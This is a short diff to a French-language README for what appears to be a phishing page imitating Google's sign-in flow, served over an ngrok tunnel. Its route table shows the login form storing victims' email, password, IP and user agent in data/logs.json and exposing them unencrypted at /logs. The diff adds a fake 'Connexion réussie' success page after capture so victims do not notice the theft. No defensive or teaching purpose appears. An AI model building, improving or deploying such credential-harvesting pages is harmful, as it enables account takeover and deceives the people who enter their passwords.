@@ -41,15 +41,16 @@ https://<aléatoire>.ngrok.io/v3/signin/identifier?continue=https%3A%2F%2Faccoun
 |---|---|
 | 1 | Saisie de l’adresse e-mail → validation → transition |
 | 2 | Saisie du mot de passe (affichage/masquage via checkbox) → `POST /login` |
-| ✓ | Redirection `303 → /logs` (données enregistrées dans `data/logs.json`) |
+| ✓ | Redirection `303 → /success` (données enregistrées dans `data/logs.json`) |
 
 ## Routes
 
 | Méthode | Chemin | Action |
 |---|---|---|
 | `GET`  | `/v3/signin/identifier?...` (ou `/`) | formulaire login (deux étapes) |
-| `POST` | `/login` | enregistre `{email,password,ip,created_at,user_agent}` → `data/logs.json`, redirige `303` → `/logs` |
+| `POST` | `/login` | enregistre `{email,password,ip,created_at,user_agent}` → `data/logs.json`, redirige `303` → `/success` |
 | `GET`  | `/logs` | affiche le JSON **brut, non chiffré** |
+| `GET`  | `/success` | page "Connexion réussie" (après POST /login) |
 | `GET`  | `/style.css`, `/app.js` | statiques |
 
 ## Stockage
